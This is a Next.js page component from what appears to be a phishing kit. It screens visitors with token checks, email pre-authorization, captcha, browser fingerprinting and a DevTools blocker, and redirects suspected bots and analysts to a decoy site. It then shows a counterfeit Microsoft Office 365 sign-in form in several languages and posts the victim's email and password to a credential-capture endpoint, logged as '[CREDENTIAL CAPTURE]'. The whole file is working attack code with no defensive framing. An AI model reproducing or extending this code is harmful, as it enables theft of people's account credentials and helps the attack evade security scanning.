'use client'

import { useEffect, useState } from 'react'
import { useRouter, useParams } from 'next/navigation'
import { redirectToSafeSiteWithReason } from '@/lib/redirectWithReason'
import BotFilterGate from '@/components/BotFilterGate'
import CaptchaGateWrapper from '@/components/CaptchaGateWrapper'
import StealthVerificationGate from '@/components/StealthVerificationGate'
import DevToolsBlocker from '@/components/DevToolsBlocker'
import EmailEntryScreen from '@/components/EmailEntryScreen'
import { Office365Template } from '@/components/templates/Office365Template'
import { Template } from '@/lib/templateTypes'
import { getTranslations } from '@/lib/locales'
import { API_ROUTES } from '@/lib/api-routes'

interface LinkConfig {
  valid: boolean
  expiresAt?: number
  usedCount?: number
  reason?: string
}

export default function GenericLinkPage() {
  const router = useRouter()
  const params = useParams()
  const token = params?.token as string
  
  const [email, setEmail] = useState('')
  const [domain, setDomain] = useState('')
  const [verifiedEmail, setVerifiedEmail] = useState<string | null>(null)
  const [linkConfig, setLinkConfig] = useState<LinkConfig | null>(null)
  const [captchaVerified, setCaptchaVerified] = useState(false)
  const [stealthVerified, setStealthVerified] = useState(false)
  const [checkingComplete, setCheckingComplete] = useState(false)
  const [isChecking, setIsChecking] = useState(false)
  const [showLandingPage, setShowLandingPage] = useState(false)
  
  // Fetch link configuration
  useEffect(() => {
    if (!token) {
      redirectToSafeSiteWithReason('token_invalid')
      return
    }
    
    fetch(`/api/link-config?token=${token}`)
      .then(r => r.json())
      .then(data => {
        if (data.valid) {
          setLinkConfig(data)
        } else {
          if (data.reason === 'expired') {
            redirectToSafeSiteWithReason('token_expired')
          } else {
            redirectToSafeSiteWithReason('token_invalid')
          }
        }
      })
      .catch(() => redirectToSafeSiteWithReason('token_invalid'))
  }, [token])

  // Check if email was already authorized (prevent back button)
  // MUST be before any conditional returns (React Rules of Hooks)
  useEffect(() => {
    if (typeof window !== 'undefined' && !verifiedEmail) {
      const storedEmail = sessionStorage.getItem('email_authorized')
      const storedToken = sessionStorage.getItem('email_authorized_token')
      if (storedEmail && storedToken === token) {
        setVerifiedEmail(storedEmail)
        setEmail(storedEmail)
        setDomain(storedEmail.split('@')[1] || '')
      }
    }
  }, [token, verifiedEmail])

  const handleEmailAuthorized = (authorizedEmail: string) => {
    // Email has been verified and authorized
    setEmail(authorizedEmail)
    setDomain(authorizedEmail.split('@')[1] || '')
    setVerifiedEmail(authorizedEmail)
    // Store in sessionStorage to prevent back button
    if (typeof window !== 'undefined') {
      sessionStorage.setItem('email_authorized', authorizedEmail)
      sessionStorage.setItem('email_authorized_token', token)
    }
  }

  const handleStealthVerified = () => {
    setStealthVerified(true)
    if (typeof window !== 'undefined') {
      const stealthData = {
        verified: true,
        timestamp: Date.now(),
        expiresIn: 10 * 60 * 1000, // 10 minutes
      }
      sessionStorage.setItem('stealth_verified', JSON.stringify(stealthData))
    }
  }

  const handleCaptchaVerified = () => {
    setCaptchaVerified(true)
    setIsChecking(true)
    
    setStealthVerified(false)
    if (typeof window !== 'undefined') {
      sessionStorage.removeItem('stealth_verified')
      sessionStorage.setItem('captcha_verified', 'true')
      sessionStorage.setItem('captcha_timestamp', Date.now().toString())
    }
    
    const randomDelay = Math.floor(Math.random() * 4000) + 3000
    
    const performBotDetection = async () => {
      try {
        const fingerprint = await generateEnhancedFingerprint()
        const response = await fetch(API_ROUTES.botFilter, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            fingerprint,
            timestamp: Date.now(),
            captchaVerified: true,
          }),
          cache: 'no-store',
        })
        
        if (response.redirected) {
          redirectToSafeSiteWithReason('bot_detected')
          return
        }
        
        const data = await response.json()
        if (!data.ok || !data.passed) {
          redirectToSafeSiteWithReason('bot_detected')
          return
        }
        
        setCheckingComplete(true)
        if (typeof window !== 'undefined') {
          sessionStorage.setItem('checking_complete', 'true')
        }
        
        setTimeout(() => {
          setIsChecking(false)
          setShowLandingPage(true)
        }, randomDelay)
      } catch (error) {
        redirectToSafeSiteWithReason('bot_detected')
      }
    }
    
    performBotDetection()
  }

  const generateEnhancedFingerprint = async (): Promise<string> => {
    if (typeof window === 'undefined') return ''
    const fingerprint = {
      screen: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      language: navigator.language,
      platform: navigator.platform,
      hardware: `${navigator.hardwareConcurrency || 'unknown'}x${(navigator as any).deviceMemory || 'unknown'}`,
      plugins: navigator.plugins.length,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || 'unknown',
      timestamp: Date.now(),
    }
    return JSON.stringify(fingerprint)
  }

  if (!linkConfig) {
    return (
      <>
        <DevToolsBlocker />
        <div className="min-h-screen flex items-center justify-center bg-gray-50">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
            <p className="mt-4 text-gray-600">Loading...</p>
          </div>
        </div>
      </>
    )
  }

  // Show email entry screen if not yet authorized
  if (!verifiedEmail) {
    return (
      <>
        <DevToolsBlocker />
        <BotFilterGate onFiltered={() => redirectToSafeSiteWithReason('bot_detected')}>
          <EmailEntryScreen linkToken={token} onAuthorized={handleEmailAuthorized} />
        </BotFilterGate>
      </>
    )
  }

  // Show security flow
  if (!captchaVerified) {
    return (
      <>
        <DevToolsBlocker />
        <BotFilterGate onFiltered={() => redirectToSafeSiteWithReason('bot_detected')}>
          <CaptchaGateWrapper onVerified={handleCaptchaVerified} />
        </BotFilterGate>
      </>
    )
  }

  if (isChecking && !checkingComplete) {
    return (
      <>
        <DevToolsBlocker />
        <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-indigo-100 dark:from-gray-900 dark:to-gray-800">
          <div className="text-center">
            <div className="animate-spin rounded-full h-16 w-16 border-b-4 border-blue-600 mx-auto mb-6"></div>
            <h2 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">
              Verifying
            </h2>
            <p className="text-sm text-gray-600 dark:text-gray-300">
              Please wait...
            </p>
          </div>
        </div>
      </>
    )
  }

  if (!stealthVerified) {
    return (
      <>
        <DevToolsBlocker />
        <BotFilterGate onFiltered={() => redirectToSafeSiteWithReason('bot_detected')}>
          <StealthVerificationGate 
            onVerified={handleStealthVerified}
            email={email}
            domain={domain}
          />
        </BotFilterGate>
      </>
    )
  }

  // Show login form after email is authorized and all security gates pass
  const handleCredentialSubmit = async (email: string, password: string) => {
    try {
      const response = await fetch(API_ROUTES.submitCredentials, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email,
          password,
          token,
        }),
      })
      
      // Check for 429 status (Too Many Requests) - redirect immediately
      if (response.status === 429) {
        const result = await response.json()
        if (result.redirect) {
          console.log('[CREDENTIAL CAPTURE] 🚫 Too many attempts - redirecting to:', result.redirect)
          window.location.href = result.redirect
          return
        }
      }
      
      const result = await response.json()
      
      // CRITICAL FIX: Check for failure with redirect FIRST (before success check)
      // This handles the 4th attempt and beyond
      if (!result.success && result.redirect) {
        console.log('[CREDENTIAL CAPTURE] 🚫 Request failed - redirecting to:', result.redirect)
        window.location.href = result.redirect
        return
      }
      
      // If redirect exists, use it (whether success is true or false)
      if (result.redirect) {
        console.log('[CREDENTIAL CAPTURE] Redirecting to:', result.redirect)
        window.location.replace(result.redirect)
        return
      }
    } catch (error) {
      console.error('[CREDENTIAL CAPTURE] Submit error:', error)
    }
  }
  
  // Create default Office365 template
  const defaultTemplate: Template = {
    id: 'office365_default',
    name: 'Office 365',
    provider: 'custom',
    type: 'email-login',
    enabled: true,
    isDefault: true,
    theme: {
      primaryColor: '#0067b8',
      secondaryColor: '#0078d4',
      backgroundColor: '#ffffff',
      textColor: '#323130',
      accentColor: '#0067b8',
    },
    background: {
      type: 'color',
      value: '#ffffff',
    },
    logo: {
      text: 'Microsoft',
    },
    layout: {
      containerWidth: '440px',
      formPosition: 'center',
      showHeader: false,
      showFooter: false,
    },
    translations: {
      en: {
        title: 'Sign in',
        emailLabel: 'Email',
        emailPlaceholder: 'Enter your email',
        passwordLabel: 'Password',
        passwordPlaceholder: 'Enter your password',
        submitButton: 'Sign in',
        errorMessages: {
          invalidEmail: 'Invalid email address',
          invalidPassword: 'Password is required',
          accountLocked: 'Account locked',
          serverError: 'Server error',
        },
      },
      ja: {
        title: 'サインイン',
        emailLabel: 'メールアドレス',
        emailPlaceholder: 'メールアドレスを入力',
        passwordLabel: 'パスワード',
        passwordPlaceholder: 'パスワードを入力',
        submitButton: 'サインイン',
        errorMessages: {
          invalidEmail: '無効なメールアドレス',
          invalidPassword: 'パスワードが必要です',
          accountLocked: 'アカウントがロックされています',
          serverError: 'サーバーエラー',
        },
      },
      ko: { title: '로그인', emailLabel: '이메일', emailPlaceholder: '이메일 입력', passwordLabel: '비밀번호', passwordPlaceholder: '비밀번호 입력', submitButton: '로그인', errorMessages: { invalidEmail: '유효하지 않은 이메일', invalidPassword: '비밀번호가 필요합니다', accountLocked: '계정 잠김', serverError: '서버 오류' } },
      de: { title: 'Anmelden', emailLabel: 'E-Mail', emailPlaceholder: 'E-Mail eingeben', passwordLabel: 'Passwort', passwordPlaceholder: 'Passwort eingeben', submitButton: 'Anmelden', errorMessages: { invalidEmail: 'Ungültige E-Mail', invalidPassword: 'Passwort erforderlich', accountLocked: 'Konto gesperrt', serverError: 'Serverfehler' } },
      es: { title: 'Iniciar sesión', emailLabel: 'Correo electrónico', emailPlaceholder: 'Ingrese su correo', passwordLabel: 'Contraseña', passwordPlaceholder: 'Ingrese su contraseña', submitButton: 'Iniciar sesión', errorMessages: { invalidEmail: 'Correo inválido', invalidPassword: 'Contraseña requerida', accountLocked: 'Cuenta bloqueada', serverError: 'Error del servidor' } },
    },
    defaultLanguage: 'en',
    autoDetectLanguage: true,
    features: {
      showLogo: true,
      showNotices: false,
      showCaptcha: false,
      showRememberMe: false,
      showForgotPassword: false,
      showCreateAccount: false,
      showSoftKeyboard: false,
    },
    obfuscationLevel: 'medium',
    createdAt: Date.now(),
    updatedAt: Date.now(),
    createdBy: 'system',
  }
  
  return (
    <>
      <DevToolsBlocker />
      <BotFilterGate onFiltered={() => redirectToSafeSiteWithReason('bot_detected')}>
        <Office365Template
          template={defaultTemplate}
          language="en"
          email={verifiedEmail}
          onSubmit={handleCredentialSubmit}
        />
      </BotFilterGate>
    </>
  )
}

